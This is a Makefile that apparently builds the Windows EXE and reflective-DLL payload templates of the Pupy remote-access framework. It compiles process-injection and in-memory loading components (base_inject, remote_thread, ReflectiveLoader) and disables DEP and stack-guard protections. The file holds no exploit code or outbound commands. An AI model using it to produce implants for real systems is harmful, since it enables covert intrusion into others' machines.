BUILDENV ?= $(PWD)/buildenv
PYTHONPATH := C:\\Python27

TEMPLATE_OUTPUT_PATH=../../pupy/payload_templates

ifndef ARCH
$(error You must specify an architecture - win64 or win32)
endif

CC := $(BUILDENV)/$(ARCH)/cl.sh
PYTHON := $(BUILDENV)/$(ARCH)/python.sh
HOST_PYTHON := python

ifeq "$(ARCH)" "win64"
CFLAGS:=$(CFLAGS) /DWIN_X64 /D_WIN64 /nologo
PPARCH := x64
else
CFLAGS:=$(CFLAGS) /DWIN_X86 /nologo
PPARCH := x86
endif

CFLAGS += /Iresources\\$(ARCH) /Iresources /DHAVE_WINDOW
# CFLAGS += /Iresources\\$(ARCH) /Iresources

ifdef DEBUG
DEBUG_ADD   := -debug
CFLAGS      := $(CFLAGS) /DDEBUG /DVERBOSE
LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:windows /ENTRY:WinMainCRTStartup user32.lib
# LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:console
PPARCH      := $(PPARCH)d
else
DEBUG_ADD   :=
LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:windows /ENTRY:WinMainCRTStartup /LTCG user32.lib
PPARCH      := $(PPARCH)
CFLAGS      := $(CFLAGS) /O1 /GL /GS-
endif

SECARGS     := "cl" ".xzdata"

CFLAGS      := $(CFLAGS) /I..\\lzma

PYOBJS := \
	_memimporter.obj \
	MyLoadLibrary.obj \
	Python-dynload.obj \
	pupy_load.obj \
	pupy.obj \
	base_inject.obj

COMMON_OBJS := \
	MemoryModule.obj \
	actctx.obj list.obj thread.obj remote_thread.obj \
	LoadLibraryR.obj

ifeq ($(UNCOMPRESSED),)
COMMON_OBJS += LzmaDec.obj
COMPRESSED = 1
else
CFLAGS += /DUNCOMPRESSED
SUFFIX := unc.$(SUFFIX)
COMPRESSED = 0
endif

all: $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)exe $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll

revision.h:
	if [ -z $$COMMIT ]; then rev=$$(cat ../../.git/`cat ../../.git/HEAD | cut -f 2 -d \ ` | cut -c 1-8); \
	 else rev=$$COMMIT; fi; echo "#define GIT_REVISION_HEAD \"$$rev\"" >$@

pupy.c: resources/$(ARCH)/library.c revision.h
pupy_load.c: resources/$(ARCH)/msvcr90.c resources/$(ARCH)/python27.c resources/bootloader.c revision.h

import-tab.c import-tab.h: mktab.py
	$(HOST_PYTHON) $(PFLAGS) $<

Python-dynload.obj: import-tab.c import-tab.h

resources/$(ARCH)/library.txt: ../gen_library_compressed_string.py resources/$(ARCH)/library.zip
	$(HOST_PYTHON) ../gen_library_compressed_string.py $@ resources/$(ARCH)/library.zip

resources/$(ARCH)/library.zip: ../build_library_zip.py
	$(PYTHON) ../build_library_zip.py $@

resources/$(ARCH)/library.c: ../gen_resource_header.py resources/$(ARCH)/library.txt resources/$(ARCH)/library.zip
	$(HOST_PYTHON) ../gen_resource_header.py resources/$(ARCH)/library.txt $@ $(COMPRESSED) $(SECARGS)

resources/bootloader.pyc: ../../pupy/packages/all/pupyimporter.py ../../pupy/pp.py ../gen_python_bootloader.py
	$(PYTHON) ../gen_python_bootloader.py $(DEBUG_ADD)

resources/bootloader.c: resources/bootloader.pyc ../gen_resource_header.py
	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)

resources/$(ARCH)/python27.dll: $(BUILDENV)/$(ARCH)/drive_c/Python27/python27.dll
	@mkdir -p resources/$(ARCH)
	cp $< $@

resources/$(ARCH)/msvcr90.dll: $(BUILDENV)/$(ARCH)/drive_c/Python27/msvcr90.dll
	@mkdir -p resources/$(ARCH)
	cp $< $@

resources/$(ARCH)/python27.c: resources/$(ARCH)/python27.dll ../gen_resource_header.py
	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)

resources/$(ARCH)/msvcr90.c: resources/$(ARCH)/msvcr90.dll ../gen_resource_header.py
	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)

$(PYOBJS): %.obj: %.c
	$(CC) /c $(CFLAGS) /I$(PYTHONPATH)\\include $<

ifeq ($(UNCOMPRESSED),)
LzmaDec.obj: ../lzma/LzmaDec.c
	$(CC) /c $(CFLAGS) $<
endif

main_exe.obj: main_exe.c
	$(CC) /c $(CFLAGS) $<

%.obj: %.c
	$(CC) /c $(CFLAGS) $<

ReflectiveLoader.obj: ReflectiveLoader.c
	$(CC) /c $(CFLAGS) /DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN /DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR /O2 /Ob1 $<

$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)exe: main_exe.obj $(PYOBJS) $(COMMON_OBJS)
	$(CC) $(CFLAGS) $+ /Fe$@ $(LINKER_OPTS)

$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll: main_reflective.obj $(PYOBJS) ReflectiveLoader.obj $(COMMON_OBJS)
	$(CC) $(CFLAGS) $+ /Fe$@ /LD

.PHONY: clean

clean:
	rm -f *.obj
	rm -f *.pyo
	rm -f *.pyc
	rm -f resources/bootloader.pyc
	rm -f resources/*.c
	rm -f resources/$(ARCH)/*.c
	rm -f $(PYOBJS) $(COMMON_OBJS)

distclean: clean
	rm -f revision.h
	rm -f import-tab.c
	rm -f import-tab.h
	rm -f revision.h
	rm -rf resources

$(COMMON_OBJS) $(PYOBJS): import-tab.h
